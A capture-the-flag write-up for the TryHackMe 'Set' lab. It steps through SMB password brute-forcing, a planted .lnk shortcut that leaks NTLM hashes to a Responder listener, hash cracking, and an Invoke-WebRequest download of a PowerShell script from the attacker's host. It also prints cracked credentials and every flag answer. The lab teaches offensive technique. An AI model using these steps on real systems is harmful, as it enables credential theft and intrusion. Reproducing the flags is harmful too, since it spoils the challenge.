# Set

Once again you find yourself on the internal network of the Windcorp Corporation.

[Set](https://tryhackme.com/room/set)

## Topic's

- Network Enumeration
- SSL Enumeration
- Web Poking
- Metasploit (smb_login)
- Linux Enumeration
- SMB Enumeration
- Brute Forcing (Hash)

## Appendix archive

Password: `1 kn0w 1 5h0uldn'7!`

## Task 1 Set

**Story**

Once again you find yourself on the internal network of the Windcorp Corporation. This tasted so good last time you were there, you came back for more.

However, they managed to secure the Domain Controller this time, so you need to find another server and on your first scan discovered "Set".

Set is used as a platform for developers and has had some problems in the recent past. They had to reset a lot of users and restore backups (maybe you were not the only hacker on their network?). So they decided to make sure all users used proper passwords and closed of some of the loose policies. Can you still find a way in? Are some user more privileged than others? Or some more sloppy? And maybe you need to think outside the box a little bit to circumvent their new security controls…

Happy Hacking!

@4nqr34z and @theart42

(Give it at least 5 minutes to boot)

```
kali@kali:~/CTFs/tryhackme/Set$ sudo nmap -A -sS -sC -sV -O -Pn 10.10.213.25
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-18 00:17 CEST
Nmap scan report for 10.10.213.25
Host is up (0.038s latency).
Not shown: 997 filtered ports
PORT    STATE SERVICE       VERSION
135/tcp open  msrpc         Microsoft Windows RPC
443/tcp open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
| ssl-cert: Subject: commonName=set.windcorp.thm
| Subject Alternative Name: DNS:set.windcorp.thm, DNS:seth.windcorp.thm
| Not valid before: 2020-06-07T15:00:22
|_Not valid after:  2036-10-07T15:10:21
|_ssl-date: 2020-10-17T22:19:03+00:00; +1s from scanner time.
| tls-alpn:
|_  http/1.1
445/tcp open  microsoft-ds?
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: specialized
Running (JUST GUESSING): AVtech embedded (87%)
Aggressive OS guesses: AVtech Room Alert 26W environmental monitor (87%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2020-10-17T22:18:27
|_  start_date: N/A

TRACEROUTE (using port 135/tcp)
HOP RTT      ADDRESS
1   37.46 ms 10.8.0.1
2   37.70 ms 10.10.213.25

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 64.90 seconds
```

![](./2020-10-18_00-20.png)

`seth.windcorp.thm`

[https://set.windcorp.thm/#contact](https://set.windcorp.thm/#contact)

![](./2020-10-18_00-21.png)

![](./2020-10-18_00-25.png)

[https://set.windcorp.thm/assets/data/users.xml](https://set.windcorp.thm/assets/data/users.xml)

```
kali@kali:~/CTFs/tryhackme/Set$ xmllint  --xpath "//row/email"  users.xml | sed -e 's/<email>//g' | sed -e 's/<\/email>//g' | sed -e 's/@windcorp.thm//g'>users.txt
```

`/usr/share/wordlists/SecLists/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt`

```
msf5> use auxiliary/scanner/smb/smb_login
msf5 auxiliary(scanner/smb/smb_login) > show options

Module options (auxiliary/scanner/smb/smb_login):

   Name               Current Setting  Required  Description
   ----               ---------------  --------  -----------
   ABORT_ON_LOCKOUT   false            yes       Abort the run when an account lockout is detected
   BLANK_PASSWORDS    false            no        Try blank passwords for all users
   BRUTEFORCE_SPEED   5                yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS       false            no        Try each user/password couple stored in the current database
   DB_ALL_PASS        false            no        Add all passwords in the current database to the list
   DB_ALL_USERS       false            no        Add all users in the current database to the list
   DETECT_ANY_AUTH    false            no        Enable detection of systems accepting any authentication
   DETECT_ANY_DOMAIN  false            no        Detect if domain is required for the specified user
   PASS_FILE                           no        File containing passwords, one per line
   PRESERVE_DOMAINS   true             no        Respect a username that contains a domain name.
   Proxies                             no        A proxy chain of format type:host:port[,type:host:port][...]
   RECORD_GUEST       false            no        Record guest-privileged random logins to the database
   RHOSTS                              yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT              445              yes       The SMB service port (TCP)
   SMBDomain          .                no        The Windows domain to use for authentication
   SMBPass                             no        The password for the specified username
   SMBUser                             no        The username to authenticate as
   STOP_ON_SUCCESS    false            yes       Stop guessing when a credential works for a host
   THREADS            1                yes       The number of concurrent threads (max one per host)
   USERPASS_FILE                       no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS       false            no        Try the username as the password for all users
   USER_FILE                           no        File containing usernames, one per line
   VERBOSE            true             yes       Whether to print output for all attempts

msf5 auxiliary(scanner/smb/smb_login) > set RHOSTS 10.10.213.25
RHOSTS => 10.10.213.25
msf5 auxiliary(scanner/smb/smb_login) > set USER_FILE ~/CTFs/tryhackme/Set/
2020-10-18_00-20.png  2020-10-18_00-25.png  users.txt
2020-10-18_00-21.png  README.md             users.xml
msf5 auxiliary(scanner/smb/smb_login) > set USER_FILE ~/CTFs/tryhackme/Set/
2020-10-18_00-20.png  2020-10-18_00-25.png  users.txt
2020-10-18_00-21.png  README.md             users.xml
msf5 auxiliary(scanner/smb/smb_login) > set USER_FILE ~/CTFs/tryhackme/Set/users.txt
USER_FILE => ~/CTFs/tryhackme/Set/users.txt
msf5 auxiliary(scanner/smb/smb_login) > set THREADS 50
THREADS => 50
msf5 auxiliary(scanner/smb/smb_login) > set PASS_FILE /usr/share/wordlists/SecLists/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt
PASS_FILE => /usr/share/wordlists/SecLists/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt
msf5 auxiliary(scanner/smb/smb_login) > run
```

`myrtleowe:Passw@rd`

```
kali@kali:~/CTFs/tryhackme/Set$ enum4linux -u myrtleowe -p Passw@rd 10.10.213.25
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sun Oct 18 00:41:16 2020

 ==========================
|    Target Information    |
 ==========================
Target ........... 10.10.213.25
RID Range ........ 500-550,1000-1050
Username ......... 'myrtleowe'
Password ......... 'Passw@rd'
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ====================================================
|    Enumerating Workgroup/Domain on 10.10.213.25    |
 ====================================================
[E] Can't find workgroup/domain


 =====================================
|    Session Check on 10.10.213.25    |
 =====================================
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 437.
[+] Server 10.10.213.25 allows sessions using username 'myrtleowe', password 'Passw@rd'
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 451.
[+] Got domain/workgroup name:

 ===========================================
|    Getting domain SID for 10.10.213.25    |
 ===========================================
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 359.
Domain Name: THMGROUP
Domain Sid: (NULL SID)
[+] Can't determine if host is part of domain or part of a workgroup
enum4linux complete on Sun Oct 18 00:41:28 2020
```

```
kali@kali:~/CTFs/tryhackme/Set$ smbclient //10.10.213.25/Files -U myrtleowe
Enter WORKGROUP\myrtleowe's password:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Jun 16 23:08:26 2020
  ..                                  D        0  Tue Jun 16 23:08:26 2020
  Info.txt                            A      123  Tue Jun 16 23:57:12 2020

                10328063 blocks of size 4096. 6158133 blocks available
smb: \> get Info.txt
getting file \Info.txt of size 123 as Info.txt (0.5 KiloBytes/sec) (average 0.5 KiloBytes/sec)
smb: \> exit
kali@kali:~/CTFs/tryhackme/Set$ cat Info.txt
Zip and save your project files here.
We will review them

BTW.
Flag1: THM{4c66e2b8d4c45a65e6a7d0c7ad4a5d7ff245dc14}
```

[http://www.mamachine.org/mslink/index.en.html](http://www.mamachine.org/mslink/index.en.html)

```
kali@kali:~/CTFs/tryhackme/Set$ chmod +x mslink_v1.3.sh
kali@kali:~/CTFs/tryhackme/Set$ ./mslink_v1.3.sh -l notimportant -n shortcut -i \\\\10.8.106.222\\test -o shortcut.lnk
Création d'un raccourci de type "dossier local" avec pour cible notimportant
kali@kali:~/CTFs/tryhackme/Set$ zip shortcut.zip shortcut.lnk
  adding: shortcut.lnk (deflated 43%)
kali@kali:~/CTFs/tryhackme/Set$
```

```
kali@kali:~/CTFs/tryhackme/Set$ smbclient //10.10.213.25/Files -U myrtleowe
Enter WORKGROUP\myrtleowe's password:
Try "help" to get a list of possible commands.
smb: \> put shortcut.zip
putting file shortcut.zip as \shortcut.zip (2.2 kb/s) (average 2.2 kb/s)
smb: \>
```

```
kali@kali:~/CTFs/tryhackme/Set$ sudo responder -I tun0
[sudo] password for kali:
Sorry, try again.
[sudo] password for kali:
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.0.0.0

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    DNS/MDNS                   [ON]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Fingerprint hosts          [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.8.106.222]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']



[+] Listening for events...
[SMB] NTLMv2-SSP Client   : 10.10.213.25
[SMB] NTLMv2-SSP Username : SET\MichelleWat
[SMB] NTLMv2-SSP Hash     : MichelleWat::SET:a0029d06f0a36f05:236B4D3FA8200BA57EBB9DF94724079D:0101000000000000C0653150DE09D2015C618D3F496D7994000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D20106000400020000000800300030000000000000000000000000200000C55C093F452F558D5890B36F8A3E4665AA6199C305CDDE75073851081101378E0A001000000000000000000000000000000000000900220063006900660073002F00310030002E0038002E003100300036002E003200320032000000000000000000
[*] Skipping previously captured hash for SET\MichelleWat
[*] Skipping previously captured hash for SET\MichelleWat
[*] Skipping previously captured hash for SET\MichelleWat
```

```
kali@kali:~/CTFs/tryhackme/Set$ john MichelleWat.hash -w=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
!!!MICKEYmouse   (MichelleWat)
1g 0:00:00:32 DONE (2020-10-18 00:56) 0.03115g/s 446845p/s 446845c/s 446845C/s !!12Honey..*7¡Vamos!
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed
```

`!!!MICKEYmouse`

```
Invoke-WebRequest http://10.8.106.222/powerup.ps1 -outfile powerup.ps1
```

```
*Evil-WinRM* PS C:\Users\MichelleWat\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\MichelleWat\Desktop> ls


    Directory: C:\Users\MichelleWat\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        6/16/2020   2:07 PM             52 Flag2.txt


*Evil-WinRM* PS C:\Users\MichelleWat\Desktop> cat Flag2.txt
Flag2: THM{690798b1780964f5f51cebd854da5a2ea236ebb5}
```

1. Flag 1

`THM{4c66e2b8d4c45a65e6a7d0c7ad4a5d7ff245dc14}`

2. Flag 2

`THM{690798b1780964f5f51cebd854da5a2ea236ebb5}`

3. Flag 3

`THM{934f7faaadab3b040edab8214789114c9d3049dd}`
